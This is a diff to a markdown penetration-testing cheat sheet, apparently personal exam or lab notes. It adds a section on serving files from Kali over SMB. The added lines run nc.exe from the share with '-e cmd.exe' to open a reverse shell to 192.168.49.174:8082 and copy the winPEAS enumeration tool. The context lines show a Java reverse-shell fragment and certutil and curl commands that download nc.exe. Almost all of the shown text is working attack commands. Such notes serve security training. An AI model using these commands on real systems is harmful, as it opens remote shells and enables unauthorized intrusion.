@@ -377,6 +377,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 > 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```
 > 1. *Windows 10* ```curl -o nc.exe http://192.168.49.176/nc.exe```
 
+##### Download a file in Windows via SMB
+> 1. *On Kali* ```smbserver.py -smb2support Share /home/jon/Downloads```
+> 2. *On Windows ```cmd.exe /c //192.168.49.174/Share/nc.exe -e cmd.exe 192.168.49.174 8082```
+> 3. copy \\192.168.49.174\Share\winPEASx64.exe
+	
 ##### Download a file in Windows via FTP client 
 > 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
 > 1. start FTP server: ```python -m pyftpdlib -p 21```
